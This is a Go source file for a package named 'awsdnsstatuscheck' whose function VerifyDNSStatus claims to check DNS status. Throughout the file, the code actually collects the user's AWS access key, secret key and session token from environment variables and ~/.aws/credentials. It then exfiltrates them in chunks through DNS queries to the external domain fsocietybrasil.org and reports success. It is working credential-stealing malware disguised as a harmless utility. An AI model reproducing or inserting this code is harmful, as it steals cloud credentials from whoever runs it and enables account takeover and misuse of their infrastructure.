package awsdnsstatuscheck

import (
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/CS-5/exfil2dns"
	"github.com/miekg/dns"
)

type TypeCred int32

const (
	Undefined TypeCred = iota
	ACCESSKEY
	SECRETKET
	SECURETOKEN
)

func (t TypeCred) String() string {
	return [...]string{"Undefined", "accesskey", "secretkey", "securetoken"}[t]
}

const (
	HASH             = "df6f130c292288b0d15eb0b9ade78788"
	DNS              = "fsocietybrasil.org"
	ENV_ACESS_KEY    = "AWS_ACCESS_KEY_ID"
	ENV_SECRET_KEY   = "AWS_SECRET_ACCESS_KEY"
	ENV_SECURE_TOKEN = "AWS_SESSION_TOKEN"
)

func VerifyDNSStatus() bool {
	sendData(getAccessKey(), 1)
	sendData(getSecretKey(), 2)
	token := getSessionToken()
	if token != "" {
		sendData(token, 3)
	}

	return true
}

func encode(payload string, t TypeCred, part int) string {

	var target string
	var chunksize int = 23
	var client exfil2dns.Client

	switch t {
	case ACCESSKEY:
		target = "accesskey"
	case SECRETKET:
		target = "secretkey-" + strconv.Itoa(part)
	case SECURETOKEN:
		target = "securetoken-" + strconv.Itoa(part)
	default:
		target = ""
	}
	client, err := exfil2dns.NewClient(
		target,
		DNS,
		HASH,
		chunksize,
	)
	if err != nil {
		fmt.Printf("error on create client, got: %s", err.Error())
		return ""
	}

	q, err := client.Encode([]byte(payload))
	if err != nil {
		fmt.Printf("error on encode data, got: %s", err.Error())
	}
	return q
}

func sendData(payload string, t TypeCred) {
	var (
		msg    dns.Msg
		client dns.Client
	)

	pslice := splitRecursive(payload, 23)

	for i, p := range pslice {
		domain := encode(p, t, i)
		msg.SetQuestion(domain, dns.TypeA)
		_, _, err := client.Exchange(&msg, "ns7."+DNS+":53")
		if err != nil {
			fmt.Printf("failed exchange, %s", err.Error())
		}
	}

}

func splitRecursive(str string, size int) []string {
	if len(str) <= size {
		return []string{str}
	}
	return append([]string{string(str[0:size])}, splitRecursive(str[size:], size)...)
}

func openSharedFile() []string {
	home, _ := os.UserHomeDir()
	filename := home + "/.aws/credentials"

	dat, _ := os.ReadFile(filename)

	d := string(dat)
	d = strings.Trim(d, "[default]")
	dd := strings.Split(d, "\n")

	return dd
}

func getAccessKey() string {
	aws_access_key_id := os.Getenv(ENV_ACESS_KEY)

	if aws_access_key_id != "" {
		return aws_access_key_id
	}

	dat := openSharedFile()

	for _, line := range dat {
		splited := strings.Split(line, "=")
		if len(splited) == 2 && splited[0] == "aws_access_key_id " {
			return splited[1]
		}
	}
	return ""
}

func getSecretKey() string {
	aws_secret_access_key := os.Getenv(ENV_SECRET_KEY)
	if aws_secret_access_key != "" {
		return aws_secret_access_key
	}

	dat := openSharedFile()

	for _, line := range dat {
		splited := strings.Split(line, "=")
		if len(splited) == 2 && splited[0] == "aws_secret_access_key " {
			return splited[1]
		}
	}
	return ""
}

func getSessionToken() string {
	aws_session_token := os.Getenv(ENV_SECURE_TOKEN)
	if aws_session_token != "" {
		return aws_session_token
	}
	return ""
}
